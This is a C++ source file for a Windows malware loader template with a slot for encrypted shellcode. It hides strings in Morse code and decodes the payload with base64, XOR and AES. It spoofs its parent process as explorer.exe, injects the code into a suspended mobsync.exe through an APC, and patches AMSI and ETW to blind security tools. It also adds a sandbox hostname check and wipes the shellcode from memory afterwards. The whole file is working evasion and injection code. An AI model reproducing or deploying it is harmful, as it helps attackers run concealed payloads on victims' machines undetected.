#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include <string>
#include <map>
#include <sstream>
#include <numeric>

using namespace std;

map< char, string > ascii_to_morse =
{
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},{'.',"^^^.__-"},
};

void tokenize(std::string const& str, const char delim,
    std::vector<std::string>& out)
{
    // construct a stream from the string 
    std::stringstream ss(str);

    std::string s;
    while (std::getline(ss, s, delim)) {
        out.push_back(s);
    }
}

string translate_morse(string morsed)
{
    string translated;

    //morse to ascii
    std::vector<std::string> lines;
    tokenize(morsed, ' ', lines);
    for (int s = 0; s < lines.size(); s++) {
        for (auto it = ascii_to_morse.rbegin(); it != ascii_to_morse.rend(); it++) {
            if (lines[s] == it->second)
            {
                translated.push_back(it->first);
            }
        }
    }
    return translated;
}

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void patchAMSI(OUT HANDLE& hProc) {

    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-.").c_str());
    void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched amsi!\n";
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void patchAMSIOpenSession(OUT HANDLE& hProc) {

    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^--- .--. . -. ^... . ... ... .. --- -.").c_str());
    void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);

    char amsiPatch[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched amsi open session!\n";
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void patchETW(OUT HANDLE& hProc) {
    LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(translate_morse("^ . - .-- ^ . ... - . - . - ^ .-- . - . .. - .").c_str());
    void* etwAddr = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);

    char etwPatch[] = { 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* etwAddr_bk = etwAddr;
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched etw!\n";

}

//reffered to alaris
void howlow_sc(std::vector<byte> recovered)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;
    PULONG dwOld = 0;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

// Mask the PPID to that of explorer.exe
HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";

if (!CreateProcess(
    hollow_bin,			// LPCWSTR Command (Binary to Execute)
    NULL,				// Command line
    NULL,				// Process handle not inheritable
    NULL,				// Thread handle not inheritable
    FALSE,				// Set handle inheritance to FALSE
    EXTENDED_STARTUPINFO_PRESENT
    | CREATE_NO_WINDOW
    | CREATE_SUSPENDED,	// Creation Flags
    NULL,				// Use parent's environment block
    NULL,				// Use parent's starting directory 
    (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
    &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
)) {
    DWORD errval = GetLastError();
    std::cout << "whoops " << errval << std::endl;
}

WaitForSingleObject(pi.hProcess, 1400);
hProcess = pi.hProcess;
hThread = pi.hThread;

mem = nullptr;
SIZE_T p_size = recovered.size();

//patch AMSI and ETW before anything else
patchAMSI(hProcess);
patchAMSIOpenSession(hProcess);
patchETW(hProcess);

NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//std::cout << "Written to " << mem << std::endl;
NtWriteVirtualMemory(hProcess, mem, recovered.data(), recovered.size(), 0);
// will be implemented soon
// VirtualProtect(mem, (size_t)p_size, 0x20, MEM_COMMIT | MEM_RESERVE);
//NtProtectVirtualMemory(hProcess, mem , (PSIZE_T)&p_size, PAGE_EXECUTE_READ, dwOld);
NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
NtResumeThread(hThread, NULL);

// Overwrite shellcode with null bytes
Sleep(9999);
uint8_t overwrite[500];
NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
}

std::string XOR(std::string decoded, std::string xorKey)
{
    char x0rek3y[19];
    for (int k = 0; k < xorKey.length(); k++) x0rek3y[k] = xorKey[k];

    int j = 0;
    for (int i = 0; i < decoded.size(); i++) {
        if (j == sizeof x0rek3y - 1) j = 0;

        decoded[i] = decoded[i] ^ x0rek3y[j];
        j++;
    }
    return decoded;
}

int main()
{
    //implement privilege escalation here
    //https://github.com/KooroshRZ/Windows-DLL-Injector/blob/61f30f3a9750600d09a19761515892e4582ec434/Injector/src

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    BOOL hugeCode = REPLACEBOOLVALUE;
    std::string morsed, sh3llc0de, decoded, b64a3skey, b64a3siv, morsedb64a3skey, morsedb64a3siv, morsedxorKey, xorKey;
    base64 b64 = base64();

    //xor
    morsed = "REPLACE SHELLCODE HERE";
    morsedb64a3skey = "REPLACE A3S_KEY";
    morsedb64a3siv = "REPLACE A3S_IV";
    morsedxorKey = "REPLACE XORKEY";

    //translate all sumarine language
    sh3llc0de = translate_morse(morsed);
    b64a3skey = translate_morse(morsedb64a3skey);
    b64a3siv = translate_morse(morsedb64a3siv);
    xorKey = translate_morse(morsedxorKey);

    // sandbox check
    string strHostname;
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);

    for (char character : name) strHostname.push_back(character);
    if (strHostname.find("CHANGESTRINGHERE") != std::string::npos) {
        //std::cout << "hit" << std::endl;
        xorKey.replace(0, 1, "~");
    }

    /*
    if (strcmp(name, "DESKTOP-H39OG3S") == 0) {
        std::cout << "Sandbox hit" << std::endl;
        xorKey.replace(0, 1, "P");
    }
    */

    decoded = b64.base64_decode(sh3llc0de);

    //xor is already in its own function
    //char x0rek3y[] = "Sup3rS3cur3K3yfTw!";
    //initialize xorKey in a weird way
    /*
    char x0rek3y[19];
    for (int k = 0; k < xorKey.length(); k++) x0rek3y[k] = xorKey[k];

    int j = 0;
    for (int i = 0; i < decoded.size(); i++) {
        if (j == sizeof x0rek3y - 1) j = 0;

        decoded[i] = decoded[i] ^ x0rek3y[j];
        j++;
    }
    */
    decoded = XOR(decoded, xorKey);

    if (!hugeCode)
    {
        ciphertext.clear();
        std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

        // AES Decryption Objects
        struct AES_ctx e_ctx;
        uint8_t key[32];
        uint8_t iv[16];
        string a3s_key = b64.base64_decode(b64a3skey);
        string a3s_iv = b64.base64_decode(b64a3siv);
        std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
        std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));

        AES_init_ctx_iv(&e_ctx, key, iv);

        // DECRYPT
        struct AES_ctx d_ctx;
        AES_init_ctx_iv(&d_ctx, key, iv);
        AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
        recovered.clear();

        // Remove the padding from the decypted plaintext
        SIZE_T c_size = ciphertext.size();
        for (int i = 0; i < c_size; i++)
        {
            if (ciphertext[i] == 0x90 && i == (c_size - 1))
            {
                break;
            }
            else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
            {
                break;
            }
            else
            {
                recovered.push_back(ciphertext[i]);
            }
        }
    }
    else
    {
        recovered.clear();
        std::copy(decoded.begin(), decoded.end(), std::back_inserter(recovered));
    }

    //process hollowing + ppid spoofing
    howlow_sc(recovered);
}

